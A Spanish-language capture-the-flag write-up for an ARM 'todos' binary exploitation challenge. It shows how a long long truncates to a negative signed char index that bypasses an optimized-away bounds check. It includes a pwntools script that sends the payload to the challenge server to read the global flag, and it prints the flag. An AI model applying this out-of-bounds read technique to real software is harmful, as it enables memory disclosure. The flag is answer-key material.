# todos

```
checksec --file todos
[*] '/home/kalcast/Descargas/Pwn/todos/todos'
    Arch:       arm-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x10000)
    Stripped:   No
```

## Saltar validaciones en main.c

``` C
int read_unsigned(char **buf, size_t *len) {
    read_line(buf, len);
    char *end;
    long long result = strtoll(*buf, &end, 10);
    if (result < 0) {
        return -1;
    } else {
        return result;
    }
}
```

Esta funcion se llama para convertir la cadena introducida en un `long long`, si es un numero grande este se trunca al conetirse a un `int` (de 8 bytes se guardan solo los 4 menos significativos)

El tipo `int` es con signo, los que significa que si su bit mas significativo (MSB) esta activo entonces el resultado es negativo.

Por ejemplo el numero "1844674407370955160" tiene estos bits:

`00011001 10011001 10011001 10011001 10011001 10011001 10011001 10011000`

Si lo convertimos a int se queda en:

`10011001 10011001 10011001 10011000`  <--- MSB activo !

Si asignamos este valor a un signed int resultara en un negativo. Aqui un programa de ejemplo:
``` C
#include <stdio.h>

void print_binary(int num) {
    for (int i = 31; i >= 0; i--) {
        printf("%d", (num >> i) & 1);
        if (i % 8 == 0) printf(" ");
        if (i == 16) printf(" | ");
    }
    printf("\n");
}

int main() {
  long long test = 1844674407370955160;
  printf("LONG LONG: %llb\n\n",test);
  printf("SIGNED INT: %d\n\n",test);
  print_binary(test);
  return 0;
}
```

```
LONG LONG: 1844674407370955160

SIGNED INT: -1717986920

10011001 10011001  | 10011001 10011000
```

Luego ese valor se usa en esta funcion:
``` C
char read_char(char **buf, size_t *len) {
    int result = read_unsigned(buf, len);
    if (result == -1 || result > CHAR_MAX) {
        return -1;
    }
    return result;
}
```

Y aqui:
``` C 
 if (choice != -1) print_todo(choice);
...
 if (choice != -1) complete_todo(choice);
```

Con un valor grande que se trunque a un negativo nos saltamos todas las validaciones en `main.c`

## Detectar out-of-bounds en `todos.c` y problemas en la validacion del indice

Todo lo anterior fue con el objetivo de explotar una vulnerabilidad aqui en `print_todo`:
``` C
void print_todo(char i) {
    if (i < 0 || i >= next) {
        printf("Invalid TODO\n");
        return;
    }

    printf("// TODO: %s%s\n", todos[i].name, todos[i].completed ? " (done!)" : "");
}
```

Esto nos permitiria leer 55 bytes de memoria de manera arbitraria como un string si no tuviese esta validacion que evita que usemos indices fuera del rango:
```
    if (i < 0 || i >= next) {             
        printf("Invalid TODO\n");
        return;
    }
```

Pero sopresa!, la validacion no funciona correctamente:
```
./todos
1. Add a TODO
2. Print a TODO
3. Mark a TODO as completed
4. Edit a TODO
5. Check for incomplete TODOs
6. Exit
What would you like to do? 2
Which TODO would you like to print? 1844674407370955160
// TODO:
```

Entonces leemos el Makefile:
``` make
.SILENT:
OPT=-Os                                               <--- Una bandera de optimizacion ?
CFLAGS=-fsigned-char -static                          <--- Todos los char son signed char, en lugar de [0,255] ahora van de [-127,128]

todos: main.o todos.o
	gcc $(CFLAGS) $(OPT) main.o todos.o -o todos
main.o: main.c todos.h
	gcc $(CFLAGS) $(OPT) -c main.c
todos.o: todos.c todos.h
	gcc $(CFLAG) $(OPT) -c todos.c

.PHONY: clean
clean:
	rm -f todos *.o
```

Bueno, con eso vemos que cuando nuestro int se le pasa a la funcion `print_todo` lo hace como un signed char. Agregemos esta linea a nuestro programa de prueba y veamos:
``` C
 printf("SIGNED CHAR: %d\n\n",(signed char)(test)
```

```
LONG LONG: 1844674407370955160

SIGNED INT: -1717986920

SIGNED CHAR: -104

10011001 10011001  | 10011001 10011000
```

En efecto termina como un indice negativo. Obviamente `i >= next` no es verdad pero `i < 0` deberia serlo.

Probé el programa en x86 y x86_64 con el mismo Makefile y funcionaba bien, no me dejo imprimir nada fuera del rango pero por alguna razon en este binario ARM la ignora.

Supongo que se debe a la bandera de optimizacion. Debe haber algun conflicto con la bandera `fsigned char` que no se da cuenta y "optimiza" el programa ignorando `i<0` porque ve que el argumento es un char y este es positivo siempre.

**ACTUALIZACION**: Explicacion del autor
![2025-05-11-204205_769x267_scrot](https://github.com/user-attachments/assets/0dbc2de9-860c-4c26-9498-8b1bd6ac86a3)


## Lectura arbitraria

Como sabemos `flag` y el struct de structs `todos` son variables globales, que debido a que el binario no tiene PIE entonces tienen una direccion de memoria fija:
```
[0x0001053c]> is~flag
2977 0x00052238 0x00063238 GLOBAL OBJ    128       flag
3389 0x0003e9f4 0x0004e9f4 GLOBAL OBJ    350       _dl_arm_cap_flags
3537 0x00052b24 0x00063b24 GLOBAL OBJ    4         _dl_stack_flags
3554 0x000384b4 0x000484b4 GLOBAL OBJ    4         __rseq_flags
[0x0001053c]> is~todos
92   ---------- 0x00000000 LOCAL  FILE   0         todos.c
107  ---------- 0x000640a0 LOCAL  OBJ    560       todos
2925 0x00000820 0x00010820 GLOBAL FUNC   52        find_incomplete_todos
```

Como leimos del resto del codigo fuente sabemos que asi luce una estructura `Todo`:
```
struct Todo {
 char name[51];
 int completed;
}
```

Es decir 55 (o 56 bytes para alineacion) son reservados.

```
>>> (0x00063238-0x000640a0)/56
-65.85714285714286
```

Para llegar desde `0x000640a0` hasta `0x00063238` vamos a necesitar un indice con valor `-65`.

Usando el programa de prueba simplemente aumente el número hasta llegar a un valor que me resultara en `-65` al convertirlo. Ese valor fue `1844674407370955455`

``` python3
# Ya habia hecho un script porque pensaba que necesitariamos algo mas complejo
from pwn import *
#io = process("./todos")
io = remote("charful.chals.damctf.xyz",30128)
elf = context.binary = ELF("./todos")
context.log_level = 'debug'
# flag 0x00063238
# todos 0x000640a0
# next 0x0006409c
# todos[-65]
payload=b"1844674407370955455"
io.recvuntil(b"do?")
io.sendline(b"2")
io.sendlineafter(b"print?",payload)
io.interactive()
```

`dam{dont_you_love_to_play_with_fun_signed_chars} `





